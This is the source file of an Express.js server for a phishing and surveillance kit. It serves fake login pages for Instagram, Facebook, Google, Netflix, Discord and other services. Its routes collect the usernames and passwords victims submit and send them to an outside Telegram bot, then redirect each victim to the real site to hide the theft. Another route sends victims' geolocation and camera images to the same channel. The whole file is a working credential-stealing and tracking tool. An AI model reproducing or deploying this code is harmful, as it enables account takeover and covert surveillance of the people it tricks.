const express = require('express');
const bodyParser = require('body-parser');
const axios = require('axios');
const path = require('path');
const { Readable } = require('stream');

const app = express();
const BOT_TOKEN = process.env.BOT_TOKEN;

app.use(bodyParser.json({ limit: '50mb' })); // Limit badha di taaki image data aa sake
app.use(bodyParser.urlencoded({ extended: true, limit: '50mb' }));

// --- Phishing & Surveillance Pages Map ---
const pageMap = {
    'Instagram': 'instagram.html', 'Facebook': 'facebook.html', 'Google': 'google.html',
    'Snapchat': 'snapchat.html', 'Amazon': 'amazon.html', 'Netflix': 'netflix.html',
    'Discord': 'discord.html', 'Gmail': 'google.html', 'InstaBlueTick': 'instabluetick.html',
    'Camera': 'camera.html', 'Location': 'location.html', 'Microphone': 'microphone.html'
};

const redirectMap = {
    'Instagram': 'https://www.instagram.com', 'Facebook': 'https://www.facebook.com',
    'Google': 'https://mail.google.com', 'Snapchat': 'https://www.snapchat.com',
    'Amazon': 'https://www.amazon.com', 'Netflix': 'https://www.netflix.com',
    'Discord': 'https://discord.com/login', 'Gmail': 'https://mail.google.com',
    'InstaBlueTick': 'https://www.instagram.com', 'Default': 'https://www.google.com'
};

// --- Dynamic Page Server ---
app.get('/', (req, res) => {
    const service = req.query.service;
    if (service && pageMap[service]) {
        res.sendFile(path.join(__dirname, 'pages', pageMap[service]));
    } else {
        res.status(404).send('Service Not Found.');
    }
});

// --- Login Data Catcher ---
app.post('/login-data', (req, res) => {
    const { username, password, service, recipientId } = req.body;
    if (!username || !password || !service || !recipientId || !BOT_TOKEN) return;

    const now = new Date();
    const message = `
💎✨ !! TOXIC NEW HIT !! ✨💎
▬▬▬▬▬▬▬▬▬▬▬▬
🎯 **Service:** *${service}*
👤 **Username:** \`${username}\`
🔑 **Password:** \`${password}\`
▬▬▬▬▬▬▬▬▬▬▬▬
🕓 **Time:** ${now.toLocaleTimeString('en-IN', { timeZone: 'Asia/Kolkata' })}
📅 **Date:** ${now.toLocaleDateString('en-IN', { timeZone: 'Asia/Kolkata' })}
🗓️ **Day:** ${now.toLocaleString('en-IN', { weekday: 'long', timeZone: 'Asia/Kolkata' })}
▬▬▬▬▬▬▬▬▬▬▬▬
MADE BY @CDMAXX
JOIN @TOXICBACK2025
    `;

    axios.post(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
        chat_id: recipientId, text: message, parse_mode: 'Markdown'
    }).then(() => res.redirect(redirectMap[service] || redirectMap['Default']));
});

// --- Surveillance Data Catcher ---
app.post('/surveillance-data', (req, res) => {
    const { type, data, recipientId } = req.body;
    if (!type || !data || !recipientId || !BOT_TOKEN) return res.sendStatus(400);

    let message;
    if (type === 'location') {
        const { lat, lon, acc } = data;
        message = `📍 **Location Hit!**\n- **Latitude:** \`${lat}\`\n- **Longitude:** \`${lon}\`\n- **Accuracy:** \`${acc}\` meters\n\n[Open Google Maps](https://www.google.com/maps/search/?api=1&query=${lat},${lon})`;
        axios.post(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
            chat_id: recipientId, text: message, parse_mode: 'Markdown'
        });
    } else if (type === 'image') {
        const buffer = Buffer.from(data.split(',')[1], 'base64');
        const formData = new FormData();
        formData.append('chat_id', recipientId);
        formData.append('photo', buffer, 'image.jpg');
        formData.append('caption', '📸 **Camera Hit!**');
        axios.post(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, formData);
    }
    res.sendStatus(200);
});

module.exports = app;
